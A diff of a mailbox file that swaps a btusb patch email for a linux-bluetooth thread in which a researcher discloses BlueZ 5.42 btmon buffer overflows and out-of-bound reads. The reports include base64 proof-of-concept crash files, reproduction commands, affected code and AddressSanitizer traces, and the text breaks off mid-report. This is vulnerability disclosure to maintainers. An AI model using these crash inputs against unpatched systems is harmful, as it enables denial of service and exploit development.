@@ -1,73 +1,737 @@
-Return-Path: <akarwar@marvell.com>
-From: Amitkumar Karwar <akarwar@marvell.com>
-To: "marcel@holtmann.org" <marcel@holtmann.org>,
-        "linux-bluetooth@vger.kernel.org" <linux-bluetooth@vger.kernel.org>
-CC: "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>,
-        Cathy Luo
-	<cluo@marvell.com>,
-        Nishant Sarmukadam <nishants@marvell.com>,
-        Ganapathi Bhat
-	<gbhat@marvell.com>
-Subject: RE: [PATCH] btusb: fix zero BD address problem during stress test
-Date: Wed, 16 Nov 2016 06:10:40 +0000
-Message-ID: <a23725dc02bb48deb00e5f9c8043bc3c@SC-EXCH04.marvell.com>
-References: <1476795449-20592-1-git-send-email-akarwar@marvell.com>
-In-Reply-To: <1476795449-20592-1-git-send-email-akarwar@marvell.com>
-Content-Type: text/plain; charset="us-ascii"
+Return-Path: <linux-bluetooth-owner@vger.kernel.org>
 MIME-Version: 1.0
+In-Reply-To: <20161115120134.GA17313@x1c>
+References: <CAFHyJTpWdNvKgvx8SGRWBVyR7PjR=kCZMjyUuFL+rb1D5_wmLA@mail.gmail.com>
+ <CABBYNZL37MnF-iXkPo1XP=v4eVXQV-OuxyRSqkY3m1q1Q0Tawg@mail.gmail.com>
+ <CAFHyJTrCdi_C2zhg-4XLZPR9PTdRX8BuhWbt0=Zmv0JMpvHKfw@mail.gmail.com>
+ <CAEZxfGP4M-qcxfUWbTXiayD=u+eO-VECcSSE-uueNLvRvtcQNQ@mail.gmail.com>
+ <CAFHyJToBuopcSE6-LoVXAPH8mTq=CJ8MDgBrLtdx_YBiHUrFhw@mail.gmail.com>
+ <CAFHyJToadPMz3H+Lg1A53W1xbURPggeDqY3ga4VuK3deF1zV+A@mail.gmail.com> <20161115120134.GA17313@x1c>
+From: "op7ic \\x00" <op7ica@gmail.com>
+Date: Tue, 15 Nov 2016 12:12:13 +0000
+Message-ID: <CAFHyJTrzPDe++4Lbu7Fx4hm5t3Z637OhAe+j9+PVn0V1sHz7NA@mail.gmail.com>
+Subject: Re: multiple buffer overflows and out-of-bound reads
+To: "op7ic \\x00" <op7ica@gmail.com>,
+        =?UTF-8?Q?Fran=C3=A7ois_Beaufort?= <beaufort.francois@gmail.com>,
+        Luiz Augusto von Dentz <luiz.dentz@gmail.com>,
+        "linux-bluetooth@vger.kernel.org" <linux-bluetooth@vger.kernel.org>
+Content-Type: text/plain; charset=UTF-8
+Sender: linux-bluetooth-owner@vger.kernel.org
 List-ID: <linux-bluetooth.vger.kernel.org>
 
-Hi Marcel,
+if I unclog my work pipeline a bit then potentially. I`ll keep an eye
+on proposing new patches for these reports at the end of my testing
+cycle for bluez.
 
-> From: Amitkumar Karwar [mailto:akarwar@marvell.com]
-> Sent: Tuesday, October 18, 2016 6:27 PM
-> To: linux-bluetooth@vger.kernel.org
-> Cc: marcel@holtmann.org; linux-kernel@vger.kernel.org; Cathy Luo;
-> Nishant Sarmukadam; Ganapathi Bhat; Amitkumar Karwar
-> Subject: [PATCH] btusb: fix zero BD address problem during stress test
->=20
-> From: Ganapathi Bhat <gbhat@marvell.com>
->=20
-> We came across a corner case issue during reboot stress test in which
-> hciconfig shows BD address is all zero. Reason is we don't get response
-> for HCI RESET command during initialization
->=20
-> The issue is tracked to a race where USB subsystem calls
-> btusb_intr_complete() to deliver a data(NOOP frame) received on
-> interrupt endpoint. HCI_RUNNING flag is not yet set by bluetooth
-> subsystem. So we ignore that frame and return.
->=20
-> As we missed to resubmit the buffer to interrupt endpoint in this case,
-> we don't get response for BT reset command downloaded after this.
->=20
-> This patch handles the corner case to resolve zero BD address problem.
->=20
-> Signed-off-by: Ganapathi Bhat <gbhat@marvell.com>
-> Signed-off-by: Amitkumar Karwar <akarwar@marvell.com>
-> ---
->  drivers/bluetooth/btusb.c | 5 +----
->  1 file changed, 1 insertion(+), 4 deletions(-)
->=20
-> diff --git a/drivers/bluetooth/btusb.c b/drivers/bluetooth/btusb.c
-> index 811f9b9..b5596ac 100644
-> --- a/drivers/bluetooth/btusb.c
-> +++ b/drivers/bluetooth/btusb.c
-> @@ -607,10 +607,7 @@ static void btusb_intr_complete(struct urb *urb)
->  	BT_DBG("%s urb %p status %d count %d", hdev->name, urb, urb-
-> >status,
->  	       urb->actual_length);
->=20
-> -	if (!test_bit(HCI_RUNNING, &hdev->flags))
-> -		return;
-> -
-> -	if (urb->status =3D=3D 0) {
-> +	if (urb->status =3D=3D 0 && test_bit(HCI_RUNNING, &hdev->flags)) {
->  		hdev->stat.byte_rx +=3D urb->actual_length;
->=20
->  		if (btusb_recv_intr(data, urb->transfer_buffer,
-
-Did you get a chance to check this?
-Please let us know if you have any review comments.
-
-Regards,
-Amitkumar
+On Tue, Nov 15, 2016 at 12:01 PM, Johan Hedberg <johan.hedberg@gmail.com> w=
+rote:
+> Hi op7ic,
+>
+> Is there any chance that you could try convert these to actual patches
+> to fix the issues?
+>
+> Johan
+>
+> On Tue, Nov 15, 2016, op7ic \x00 wrote:
+>> here are 4 crashes resulting in either out-of-bound reads or buffer
+>> overflows (see attached) but this time in btmon. They are pretty much
+>> similar to bugs reported previously.
+>>
+>> On Tue, Nov 15, 2016 at 10:51 AM, op7ic \x00 <op7ica@gmail.com> wrote:
+>> > I got couple in btmon and I started looking at BO's in btmon too.
+>> >
+>> > FWIW whenever the code base is shared similar bugs will appear. You
+>> > notice that a lot of BO issues reported are for example due to
+>> > unchecked memcpy or just lack of boundary verification on arrays etc .
+>> > Once you hit that point same bug appears.
+>> >
+>> >
+>> >
+>> >
+>> > On Tue, Nov 15, 2016 at 10:41 AM, Fran=C3=A7ois Beaufort
+>> > <beaufort.francois@gmail.com> wrote:
+>> >> FWIW, I have been witnessing btmon buffer overflows this morning but
+>> >> can't reproduce anymore.
+>> >>
+>> >> On Tue, Nov 15, 2016 at 10:25 AM, op7ic \x00 <op7ica@gmail.com> wrote=
+:
+>> >>> alright will do - thanks for replying.
+>> >>>
+>> >>> On Tue, Nov 15, 2016 at 9:18 AM, Luiz Augusto von Dentz
+>> >>> <luiz.dentz@gmail.com> wrote:
+>> >>>> Hi,
+>> >>>>
+>> >>>> On Mon, Nov 14, 2016 at 7:06 PM, op7ic \x00 <op7ica@gmail.com> wrot=
+e:
+>> >>>>> Hello list,
+>> >>>>>
+>> >>>>> I have been playing with hcidump tool recently and came across
+>> >>>>> following bugs coming from either out-of-bound reads or buffer
+>> >>>>> overflows  (see attached reports).
+>> >>>>>
+>> >>>>> There are couple more I`m working on and will send these later.
+>> >>>>
+>> >>>> I guess we want these to be tested against btmon, hcidump is a depr=
+ecated.
+>> >>>>
+>> >>>> --
+>> >>>> Luiz Augusto von Dentz
+>> >>> --
+>> >>> To unsubscribe from this list: send the line "unsubscribe linux-blue=
+tooth" in
+>> >>> the body of a message to majordomo@vger.kernel.org
+>> >>> More majordomo info at  http://vger.kernel.org/majordomo-info.html
+>
+>> Machine: x86_64
+>> OS: linux-gnu
+>> Compiler: gcc
+>> Compilation CFLAGS:  -O0 -ggdb3 -fsanitize=3Daddress
+>> Machine Type: x86_64-unknown-linux-gnu
+>> BlueZ Version: 5.42
+>> Release Status: release
+>> Source: http://www.kernel.org/pub/linux/bluetooth/bluez-5.42.tar.xz
+>>
+>> Description:
+>>
+>> A buffer overflow was identified in "l2cap_packet" function in "monitor/=
+packet.c" source file. This issue can be triggered by processing a corrupte=
+d dump file and will result in hcidump crash. To replicate this issue use t=
+he attached sample below and execute the following command:
+>>
+>> ./monitor/btmon -r <PoC File>
+>>
+>>
+>> PoC.file base64 encoded:
+>>
+>> AAAAGAOEAAAAABAAAAMAEAkjChgAAwP7AgMDAxADEBAJIwoYAAMD+wIDAwMQAxAAAwMDAA=
+=3D=3D
+>>
+>>
+>>
+>> Affected code:
+>>
+>> 3161                 index_list[index][in].frag_buf =3D malloc(len);
+>> 3162                 if (!index_list[index][in].frag_buf) {
+>> 3163                         print_text(COLOR_ERROR, "failed buffer allo=
+cation")     ;
+>> 3164                         packet_hexdump(data, size);
+>> 3165                         return;
+>> 3166                 }
+>> 3167
+>> 3168                 memcpy(index_list[index][in].frag_buf, data, size);
+>> 3169                 index_list[index][in].frag_pos =3D size;
+>> 3170                 index_list[index][in].frag_len =3D len - size;
+>> 3171                 index_list[index][in].frag_cid =3D cid;
+>> 3172                 break;
+>>
+>>
+>>
+>> Repeat-By:
+>> echo <above base64> > PoC.64
+>> base64 -d PoC.b64 > PoC.file
+>> valgrind ./monitor/btmon -r PoC.file
+>>
+>>
+>> ASAN Report (bluez  needs to compiled with -fsanitize=3Daddress for this=
+):
+>>
+>> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+>> =3D=3D27023=3D=3DERROR: AddressSanitizer: stack-buffer-overflow on addre=
+ss 0x76cf40a9c2c2 at pc 0x679d7a177792 bp 0x76cf40a9b830 sp 0x76cf40a9aff0
+>> READ of size 4095 at 0x76cf40a9c2c2 thread T0
+>> < HCI Command: Unknown (0x00|0x0003) plen 16                            =
+                                                   [hci0] 0.004096
+>>         09 23 0a 18 00 03 03 fb 02 03 03 03              .#..........
+>> < ACL Data TX: Handle 771 flags 0x00 dlen 4099                          =
+                                            [hci0] 94308888.197627
+>>     #0 0x679d7a177791 (/usr/lib/x86_64-linux-gnu/libasan.so.1+0x2e791)
+>>     #1 0x4b9ecc in l2cap_packet monitor/l2cap.c:3168
+>>     #2 0x47dda6 in packet_hci_acldata monitor/packet.c:9115
+>>     #3 0x483777 in packet_monitor monitor/packet.c:3846
+>>     #4 0x417f68 in control_reader monitor/control.c:1415
+>>     #5 0x40a142 in main monitor/main.c:220
+>>     #6 0x679d79bb0b44 in __libc_start_main (/lib/x86_64-linux-gnu/libc.s=
+o.6+0x21b44)
+>>     #7 0x40b03e (/opt/bluez/monitor/btmon+0x40b03e)
+>>
+>> Address 0x76cf40a9c2c2 is located in stack of thread T0 at offset 1778 i=
+n frame
+>>     #0 0x417b4f in control_reader monitor/control.c:1375
+>>
+>>   This frame has 5 object(s):
+>>     [32, 34) 'pktlen'
+>>     [96, 98) 'index'
+>>     [160, 162) 'frequency'
+>>     [224, 240) 'tv'
+>>     [288, 1778) 'buf' <=3D=3D Memory access at offset 1778 overflows thi=
+s variable
+>> HINT: this may be a false positive if your program uses some custom stac=
+k unwind mechanism or swapcontext
+>>       (longjmp and C++ exceptions *are* supported)
+>> SUMMARY: AddressSanitizer: stack-buffer-overflow ??:0 ??
+>> Shadow bytes around the buggy address:
+>>   0x0eda6814b800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0eda6814b810: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0eda6814b820: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0eda6814b830: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0eda6814b840: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>> =3D>0x0eda6814b850: 00 00 00 00 00 00 00 00[02]f4 f3 f3 f3 f3 00 00
+>>   0x0eda6814b860: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1
+>>   0x0eda6814b870: f1 f1 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0eda6814b880: 00 00 f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00
+>>   0x0eda6814b890: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0eda6814b8a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>> Shadow byte legend (one shadow byte represents 8 application bytes):
+>>   Addressable:           00
+>>   Partially addressable: 01 02 03 04 05 06 07
+>>   Heap left redzone:       fa
+>>   Heap right redzone:      fb
+>>   Freed heap region:       fd
+>>   Stack left redzone:      f1
+>>   Stack mid redzone:       f2
+>>   Stack right redzone:     f3
+>>   Stack partial redzone:   f4
+>>   Stack after return:      f5
+>>   Stack use after scope:   f8
+>>   Global redzone:          f9
+>>   Global init order:       f6
+>>   Poisoned by user:        f7
+>>   Contiguous container OOB:fc
+>>   ASan internal:           fe
+>> =3D=3D27023=3D=3DABORTING
+>
+>> Machine: x86_64
+>> OS: linux-gnu
+>> Compiler: gcc
+>> Compilation CFLAGS:  -O0 -ggdb3 -fsanitize=3Daddress
+>> Machine Type: x86_64-unknown-linux-gnu
+>> BlueZ Version: 5.42
+>> Release Status: release
+>> Source: http://www.kernel.org/pub/linux/bluetooth/bluez-5.42.tar.xz
+>>
+>> Description:
+>>
+>> A out-of-bound read was identified in "packet_hexdump" function in "moni=
+tor/packet.c" source file. This issue can be triggered by processing a corr=
+upted dump file and will result in hcidump crash. To replicate this issue u=
+se the attached sample below and execute the following command:
+>>
+>> ./monitor/btmon -r <PoC File>
+>>
+>>
+>> PoC.file base64 encoded:
+>> AACACQQHGAAaERDoAwAAAAkjBxgAAwMDAwMDAwMDAwMDAwMDAwMDAw=3D=3D
+>>
+>>
+>> Affected code:
+>>
+>>  3736         static const char hexdigits[] =3D "0123456789abcdef";
+>>  3737         char str[68];
+>>  3738         uint16_t i;
+>>  3739
+>>  3740         if (!len)
+>>  3741                 return;
+>>  3742
+>>  3743         for (i =3D 0; i < len; i++) {
+>>  3744                 str[((i % 16) * 3) + 0] =3D hexdigits[buf[i] >> 4]=
+;
+>>  3745                 str[((i % 16) * 3) + 1] =3D hexdigits[buf[i] & 0xf=
+];
+>>  3746                 str[((i % 16) * 3) + 2] =3D ' ';
+>>
+>>
+>>
+>> Repeat-By:
+>> echo <above base64> > PoC.64
+>> base64 -d PoC.b64 > PoC.file
+>> valgrind ./monitor/btmon -r PoC.file
+>>
+>>
+>> ASAN Report (bluez  needs to compiled with -fsanitize=3Daddress for this=
+):
+>>
+>> =3D=3D13306=3D=3DERROR: AddressSanitizer: stack-buffer-overflow on addre=
+ss 0x79fe1636c7e2 at pc 0x42cb3c bp 0x79fe1636bca0 sp 0x79fe1636bc98
+>> READ of size 1 at 0x79fe1636c7e2 thread T0
+>> > ACL Data RX: Handle 0 flags 0x00 dlen 2304                            =
+                                                                           =
+                                                                           =
+                                            [hci0] 0.437326056
+>>         invalid packet size (32764 !=3D 2304)
+>>         23 07 18 00 03 03 03 03 03 03 03 03 03 03 03 03  #..............=
+.
+>>         03 03 03 03 03 03 03 00 00 00 00 00 20 08 82 40  ............ ..=
+@
+>>         00 28 80 20 00 00 00 00 40 01 40 23 00 00 00 00  .(. ....@.@#...=
+.
+>>         a0 04 20 00 00 00 00 00 00 04 00 80 00 00 00 00  .. ............=
+.
+>>         00 00 10 04 ff ff ff ff 04 01 04 86 9a 39 1c 20  .............9.
+>>         54 70 00 00 00 00 00 00 00 00 00 00 00 00 00 00  Tp.............=
+.
+>>         00 00 00 00 00 00 00 00 00 00 00 00 ff ff ff ff  ...............=
+.
+>>         ff ff ff ff 04 00 00 00 4c 00 00 00 00 00 00 00  ........L......=
+.
+>>         00 00 00 00 9a 39 1c 20 54 70 00 00 00 00 00 00  .....9. Tp.....=
+.
+>>         00 00 00 00 56 98 54 00 00 00 00 00 80 c8 36 00  ....V.T.......6=
+.
+>>         00 00 00 00 1b 00 00 00 00 00 00 00 59 98 54 00  ............Y.T=
+.
+>>         00 00 00 00 00 80 81 21 54 70 00 00 a2 e5 32 1f  .......!Tp....2=
+.
+>>         54 70 00 00 62 53 61 21 54 70 00 00 00 00 00 00  Tp..bSa!Tp.....=
+.
+>>         00 00 00 00 74 78 61 21 54 70 00 00 80 c5 36 16  ....txa!Tp....6=
+.
+>>         fe 79 00 00 00 b0 82 21 54 70 00 00 00 00 00 00  .y.....!Tp.....=
+.
+>>         00 00 00 00 08 00 00 00 30 00 00 00 50 c8 36 16  ........0...P.6=
+.
+>>         fe 79 00 00 90 c7 36 16 fe 79 00 00 50 f8 1d 20  .y....6..y..P..
+>>         54 70 00 00 a0 e2 51 20 54 70 00 00 00 00 00 00  Tp....Q Tp.....=
+.
+>>         00 00 00 00 00 00 00 00 00 00 00 00 18 c8 36 16  ..............6=
+.
+>>         fe 79 00 00 17 c8 36 16 fe 79 00 00 34 c3 36 16  .y....6..y..4.6=
+.
+>>         fe 79 00 00 00 00 00 00 00 00 00 00 00 00 00 91  .y.............=
+.
+>>         6d 2c fc f3 01 00 00 00 00 00 00 00 80 c5 36 16  m,............6=
+.
+>>         fe 79 00 00 00 80 81 21 54 70 00 00 a2 e5 32 1f  .y.....!Tp....2=
+.
+>>         54 70 00 00 00 00 e0 85 6d 2c fc f3 00 00 c2 f0  Tp......m,.....=
+.
+>>         c2 42 a8 e0 00 00 00 00 00 00 00 00 80 c5 36 16  .B............6=
+.
+>>         fe 79 00 00 b8 79 82 21 54 70 00 00 51 45 52 20  .y...y.!Tp..QER
+>>         54 70 00 00 00 00 40 86 6d 2c fc f3 00 00 c2 f0  Tp....@.m,.....=
+.
+>>         c2 42 a8 e0 06 00 00 00 00 00 00 00 80 c5 36 16  .B............6=
+.
+>>         fe 79 00 00 05 16 62 21 54 70 00 00 89 53 74 20  .y....b!Tp...St
+>>         54 70 00 00 c8 86 81 21 54 70 00 00 01 00 00 00  Tp.....!Tp.....=
+.
+>>         00 00 00 00 80 c8 36 16 fe 79 00 00 98 86 81 21  ......6..y.....=
+!
+>>         54 70 00 00 9b 5b 61 21 54 70 00 00 00 00 01 00  Tp...[a!Tp.....=
+.
+>>         01 00 01 00 01 00 01 00 01 00 01 00 01 00 01 00  ...............=
+.
+>>         01 00 00 00 35 63 61 21 54 70 00 00 01 00 00 00  ....5ca!Tp.....=
+.
+>>         fe 79 00 00 00 80 81 21 54 70 00 00 00 00 00 00  .y.....!Tp.....=
+.
+>>         00 00 00 00 28 ea 9c 20 54 70 00 00 68 0a 73 20  ....(.. Tp..h.s
+>>         54 70 00 00 b5 55 61 21 54 70 00 00 01 00 00 00  Tp...Ua!Tp.....=
+.
+>>         fe 79 00 00 d8 99 81 21 54 70 00 00 30 c4 36 16  .y.....!Tp..0.6=
+.
+>>         fe 79 00 00 1c 1c 61 21 54 70 00 00 a8 e8 9c 20  .y....a!Tp.....
+>>         54 70 00 00 1c 1c 61 21 54 70 00 00 03 00 00 00  Tp....a!Tp.....=
+.
+>>         00 00 00 00 2e 03 31 1c 00 00 00 00 03 00 00 00  ......1........=
+.
+>>         00 00 00 00 0b 00 00 00 00 00 00 00 f8 86 81 21  ...............=
+!
+>>         54 70 00 00 8e 25 61 21 54 70 00 00 28 bd 17 20  Tp...%a!Tp..(..
+>>         54 70 00 00 00 c5 36 16 fe 79 00 00 28 bd 17 20  Tp....6..y..(..
+>>         54 70 00 00 48 c1 17 20 54 70 00 00 10 c6 36 16  Tp..H.. Tp....6=
+.
+>>         fe 79 00 00 0c c4 70 00 00 00 00 00 00 c6 36 16  .y....p.......6=
+.
+>>         fe 79 00 00 80 87 81 21 54 70 00 00 00 00 00 00  .y.....!Tp.....=
+.
+>>         00 00 00 00 80 87 81 21 54 70 00 00 00 a0 81 21  .......!Tp.....=
+!
+>>         54 70 00 00 04 14 40 00 00 00 00 00 78 8d 18 20  Tp....@.....x..
+>>         54 70 00 00 70 0a 40 00 00 00 00 00 00 00 00 00  Tp..p.@........=
+.
+>>         01 00 00 00 2c 00 00 00 01 00 00 00 90 c6 36 16  ....,.........6=
+.
+>>         fe 79 00 00 80 87 81 21 54 70 00 00 a0 c6 36 16  .y.....!Tp....6=
+.
+>>         fe 79 00 00 00 b5 82 21 54 70 00 00 c8 c6 36 16  .y.....!Tp....6=
+.
+>>         fe 79 00 00 a8 b1 82 21 54 70 00 00 01 00 00 00  .y.....!Tp.....=
+.
+>>         00 00 00 00 3d 27 61 21 54 70 00 00 00 00 00 00  ....=3D'a!Tp...=
+...
+>>         00 00 00 00 80 87 81 21 54 70 00 00 01 00 00 00  .......!Tp.....=
+.
+>>         54 70 00 00 00 00 00 00 00 00 00 00 01 00 00 00  Tp.............=
+.
+>>         00 00 00 00 a8 b1 82 21 54 70 00 00 03 00 00 00  .......!Tp.....=
+.
+>>         00 00 00 00 0b 00 00 00 00 00 00 00 f8 86 81 21  ...............=
+!
+>>         54 70 00 00 8e 25 61 21 54 70 00 00 00 00 00 00  Tp...%a!Tp.....=
+.
+>>         00 00 00 00 00 b5 82 21 54 70 00 00 10 c6 36 16  .......!Tp....6=
+.
+>>         fe 79 00 00 00 c6 36 16 fe 79 00 00 2e 03 31 1c  .y....6..y....1=
+.
+>>         00 00 00 00 04 14 40 00 00 00 00 00 ff ff ff ff  ......@........=
+.
+>>         00 00 00 00 20 0f 40 00 00 00 00 00 48 c1 17 20  .... .@.....H..
+>>         54 70 00 00 00 a0 81 21 54 70 00 00 00 a0 81 21  Tp.....!Tp.....=
+!
+>>         54 70 00 00 da 15 40 00 00 00 00 00 78 8d 18 20  Tp....@.....x..
+>>         54 70 00 00 38 03 40 00 00 00 00 00 00 00 00 00  Tp..8.@........=
+.
+>>         01 00 00 00 54 02 00 00 01 00 00 00 01 00 00 00  ....T..........=
+.
+>>         00 00 00 00 80 87 81 21 54 70 00 00 b0 c7 36 16  .......!Tp....6=
+.
+>>         fe 79 00 00 00 b5 82 21 54 70 00 00 d8 c7 36 16  .y.....!Tp....6=
+.
+>>         fe 79 00 00 e8 56 7d 00 00 00 00 00 00 00 00 00  .y...V}........=
+.
+>>         00 00 00 00 00 00 00 00 00 00 00 00 f0 ef 00 00  ...............=
+.
+>>         20 60 00 00 00 00 00 00 00 00 00 00 00 c8 36 16   `............6=
+.
+>>         fe 79 00 00 c7 6d 61 21 54 70 00 00 01 00 00 00  .y...ma!Tp.....=
+.
+>> :    #0 0x42cb3b in packet_hexdump monitor/packet.c:3744
+>>     #1 0x47dd2b in packet_hexdump monitor/packet.c:3740
+>>     #2 0x47dd2b in packet_hci_acldata monitor/packet.c:9108
+>>     #3 0x483752 in packet_monitor monitor/packet.c:3849
+>>     #4 0x417f68 in control_reader monitor/control.c:1415
+>>     #5 0x40a142 in main monitor/main.c:220
+>>     #6 0x705420199b44 in __libc_start_main (/lib/x86_64-linux-gnu/libc.s=
+o.6+0x21b44)
+>>     #7 0x40b03e (/opt/bluez/monitor/btmon+0x40b03e)
+>>
+>> Address 0x79fe1636c7e2 is located in stack of thread T0 at offset 1778 i=
+n frame
+>>     #0 0x417b4f in control_reader monitor/control.c:1375
+>>
+>>   This frame has 5 object(s):
+>>     [32, 34) 'pktlen'
+>>     [96, 98) 'index'
+>>     [160, 162) 'frequency'
+>>     [224, 240) 'tv'
+>>     [288, 1778) 'buf' <=3D=3D Memory access at offset 1778 overflows thi=
+s variable
+>> HINT: this may be a false positive if your program uses some custom stac=
+k unwind mechanism or swapcontext
+>>       (longjmp and C++ exceptions *are* supported)
+>> SUMMARY: AddressSanitizer: stack-buffer-overflow monitor/packet.c:3744 p=
+acket_hexdump
+>> Shadow bytes around the buggy address:
+>>   0x0f4042c658a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0f4042c658b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0f4042c658c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0f4042c658d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0f4042c658e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>> =3D>0x0f4042c658f0: 00 00 00 00 00 00 00 00 00 00 00 00[02]f4 f3 f3
+>>   0x0f4042c65900: f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0f4042c65910: 00 00 f1 f1 f1 f1 00 00 00 00 00 00 00 00 00 00
+>>   0x0f4042c65920: 00 00 00 00 00 00 f3 f3 f3 f3 00 00 00 00 00 00
+>>   0x0f4042c65930: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0f4042c65940: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>> Shadow byte legend (one shadow byte represents 8 application bytes):
+>>   Addressable:           00
+>>   Partially addressable: 01 02 03 04 05 06 07
+>>   Heap left redzone:       fa
+>>   Heap right redzone:      fb
+>>   Freed heap region:       fd
+>>   Stack left redzone:      f1
+>>   Stack mid redzone:       f2
+>>   Stack right redzone:     f3
+>>   Stack partial redzone:   f4
+>>   Stack after return:      f5
+>>   Stack use after scope:   f8
+>>   Global redzone:          f9
+>>   Global init order:       f6
+>>   Poisoned by user:        f7
+>>   Contiguous container OOB:fc
+>>   ASan internal:           fe
+>> =3D=3D13306=3D=3DABORTING
+>>
+>
+>> Machine: x86_64
+>> OS: linux-gnu
+>> Compiler: gcc
+>> Compilation CFLAGS:  -O0 -ggdb3 -fsanitize=3Daddress
+>> Machine Type: x86_64-unknown-linux-gnu
+>> BlueZ Version: 5.42
+>> Release Status: release
+>> Source: http://www.kernel.org/pub/linux/bluetooth/bluez-5.42.tar.xz
+>>
+>> Description:
+>>
+>> An buffer overflow was observed in "pklg_read_hci" function in "btsnoop.=
+c" source file. This issue can be triggered by processing a corrupted dump =
+file and will result in hcidump crash. To replicate this issue use the atta=
+ched sample below and execute the following command:
+>>
+>> ./monitor/btmon -r <PoC File>
+>>
+>>
+>>
+>> PoC.file base64 encoded:
+>>
+>> AAAQABkQAKLNFQCAAgICFwIXAAEABU5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5O=
+Tk5O
+>> Tk5OTqGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGh=
+oaGh
+>> oU5OTk5OTk5OTk5OTk5dTgAAdXV1dXV1dXV1dXV1dXV1MyQ+Plj7AbrYA4QBABIgPj08Gjq6=
+AAME
+>> AQC62AMEAQAwPkc+WgABABAD3AEAPgAEGj4uPrrYEgQBAIw+Pk1YGj66AAMEAQAAkI+PAECP=
+lNOA
+>> AAEAEj5NPlgC/4AA9gQBABI+PgEAAAC6AAMEAT4+AQAAALoAAwQB/3///z5YAAEfAA7mAQA+=
+CAQa
+>> Pho+utgDBAEAMD4+PlgAAR8AA+YBAD4ABBY+QD7//wMEAQAFPj49WAY+uugDBPUAEj4+Plga=
+PrrY
+>> AwQBACKdAAAYGj66AAMEAQASJD4+WBo+utgDBAEA/38AAAwaPgAAAAEBADMkPj5YAAG62AOE=
+AQAS
+>> ID49PBo6ugADBAEAutgDBAEAMD5HPloAAQAQA9wBAD4ABBo+Lj66ABAfAAPmAQABAAQWcHBw=
+cHBw
+>> cP//f/9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT71PT09PT4D/T09PT09P=
+D09P
+>> T09PT09PT09PT09PT09PT09PT09PT09PT09RT09PUk9PT09PT09PT09PT09PT0////8ABAkE=
+AiAA
+>> KgUZEACizRUVNAICABI+PgEAAAC6CQMEAf9///8+WAABHwAO5gEAPggEGj4aPrrYAwQBAE0+=
+Pj5Y
+>> AAEfAAPmAQA+AAQWPkA+//8DBAEABT4+PVgGPrroAwT1ABI+Pj5YGj662AMEAQBDnQAAAQA+=
+CAQa
+>> Pho+utgDBAEAMD4+PlgAAR8AA+YBAD4ABBY+QD7//wMEAQAFPj49WAY+uugDBPUAEj4+Plga=
+PrrY
+>> AwQBAEOdAAAYGj66AAMEAQASJD4+WBo+utgDBAEA/38AAAwaPgAAAAEBABgaProAAwQBABIk=
+Pj5Y
+>> Gj662AMEAQD/fwAADBo+AAAAAQEAMyQ+PlgAAbrYA4QBABIgPj08Gjq6AAMEDwC62AMEAQAw=
+Pkc+
+>> WgABABwD3AEAPgAEGj4uPrrYEgQBAIw+Pk1YGj66AAMEAQAAkI+PAEBPT09PT09PT09PT09P=
+T09P
+>> T09PT09PT08DhAEAEiA+PTwaOroAAwQBALrYAwQBADA+Rz5aAAEAEAPcAQA+j5TTgAABABI+=
+TT5Y
+>> Av+AAPYEAQASPj4BAAAAugADBAEAED4+PlgWAR8ADuYBAD4IBBo+Gj662E5OTk5OTk5dTk51=
+dXV1
+>> dXV1dXV1dXV1dXV1dXV1dXV1dXVOTk5OTk5OTk5OTk5OTk5OTk5OTugLAAAC////fwIXAAGA=
+////
+>> AAQJBAIgACoFGRAAnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ1AnZ2dnZ2dnZ2dnZ2dnZ2d=
+nZ2d
+>> nZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ0AAAC6AAMEAQAQPj4+WAABH09P=
+T09P
+>> T09PT08PT09PT09PT09PT09PT09PT09PT09PT3BwcHBwcJJwcHBwiHBwcHDucHBwcHBwcHBw=
+cHBw
+>> cHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwEHBwcHBwcHBwcHBwcHBwcHBw=
+T3Bw
+>> cAIgACoFGRAAos0VFTQCAgAgPj4BAAAAugADBAH/f///PlgAAR8ADuYBAD4IBHBwPgAZGj5w=
+cHBw
+>> cHBgcHBwcHBwcHBwcHBwQHBwcHBwcHBwGj662BIEAQCMPj5NWBoADuYBAD4IBHBwPgAZGj5w=
+cHBw
+>> cHBgcHBwcHBwcHBwcHBwQHBwcHBwcHBwGj662BIEAQCMPj5NWBo+ugADBAEAEiA+Plj///9/=
+EAQB
+>> ABI+TVgGProAAwQBABI+Pj5YJAAQQA=3D=3D
+>>
+>>
+>>
+>> Affected code:
+>>
